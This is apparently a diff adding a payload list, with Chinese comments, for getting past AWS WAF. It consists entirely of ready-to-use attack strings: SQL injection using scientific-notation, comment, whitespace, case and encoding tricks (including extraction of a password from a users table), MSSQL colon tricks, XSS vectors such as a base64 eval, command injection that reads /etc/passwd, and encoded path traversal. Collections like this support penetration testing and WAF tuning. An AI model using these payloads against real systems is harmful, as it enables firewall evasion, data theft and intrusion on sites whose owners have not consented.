@@ -1,0 +1,50 @@
+# AWS WAF Bypass Payloads
+# 来源: PayloadsAllTheThings, GoSecure研究
+# AWS WAF绕过技术
+
+# === SQL注入绕过 ===
+# 科学计数法 (AWS WAF特有漏洞)
+' or 1.e('')='
+1' or 1.e(1) or '1'='1
+' or 1.e(1)='1
+1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
+SELECT table_name FROM information_schema 1.e.tables
+SELECT table_name FROM information_schema .tables
+
+# 条件注释
+/*!50000UNION*//*!50000SELECT*/1,2,3--
+' /*!50000AND*/ 1=1--
+' /*!50000OR*/ 1=1--
+
+# 空格替代
+'/**/OR/**/1=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'+OR+1=1--
+
+# 大小写混合
+' UnIoN SeLeCt 1,2,3--
+' oR 1=1--
+
+# 编码绕过
+%27%20OR%20%271%27%3D%271
+%252527%2520OR%25201=1--
+
+# MSSQL特有 (AWS WAF漏洞)
+# MSSQL允许在关键字后使用冒号
+SELECT::int
+UNION:SELECT:1,2,3--
+
+# === XSS绕过 ===
+<svg/onload=alert(1)>
+<img src=x onerror=alert`1`>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# === 命令注入绕过 ===
+;cat${IFS}/etc/passwd
+;{cat,/etc/passwd}
+;c\at /e\tc/pa\sswd
+
+# === 路径遍历绕过 ===
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
